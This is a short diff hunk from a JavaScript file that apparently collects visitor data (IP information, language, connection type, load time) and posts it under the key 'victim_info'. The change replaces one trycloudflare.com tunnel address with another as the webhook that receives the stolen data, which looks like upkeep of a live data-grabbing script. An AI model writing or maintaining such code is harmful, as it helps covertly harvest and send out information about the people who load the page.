@@ -76,7 +76,7 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-            const webhookURL = "https://ict-polyphonic-rapids-recipes.trycloudflare.com/userData";
+            const webhookURL = "https://trash-hour-w-finals.trycloudflare.com/userData";
 
             const payload = {
                 'victim_info': ipinfo, 
